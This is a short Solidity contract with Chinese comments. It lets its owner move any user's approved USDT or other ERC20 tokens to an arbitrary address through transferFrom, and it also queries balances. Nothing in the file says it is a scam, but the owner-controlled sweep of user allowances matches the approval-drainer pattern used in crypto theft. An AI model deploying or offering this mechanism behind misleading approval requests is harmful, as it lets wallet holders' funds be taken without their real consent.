// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 < 0.9.0;


// 定义 ERC20 接口
interface IERC20 {
    //approve 授权，spender合约地址（或者是钱包地址）， amount授权额度
    function approve(address spender, uint256 amount) external returns (bool);
    //转账 sender来源钱包地址， recipient目标钱包地址， amount转账额度
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    //查询额度
    function balanceOf(address account) external view returns (uint256);
    //approve 授权事件
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SpendCoin {
    address  public owner; // 合约所有者地址

    constructor() {
        owner = msg.sender; // 设置合约部署者为所有者
    }

    // 将用户授权的 USDT 从用户地址转到指定地址
    function spendUserCoin(
        address tokenAddress, // USDT 合约地址
        address from,         // USDT 所属用户地址
        address to,           // 目标接收地址
        uint256 amount        // 转移数量
    ) external {
        require(msg.sender == owner, "Only the owner can call this function");

        IERC20 token = IERC20(tokenAddress); // 实例化 USDT 合约

        // 调用 transferFrom，从用户地址转 USDT 到目标地址
        bool success = token.transferFrom(from, to, amount);
        require(success, "USDT transfer failed");
    }

    // 查询用户的 USDT 余额
    function getUSDTBalance(address tokenAddress, address user) external view returns (uint256) {
        IERC20 token = IERC20(tokenAddress);
        return token.balanceOf(user);
    }

}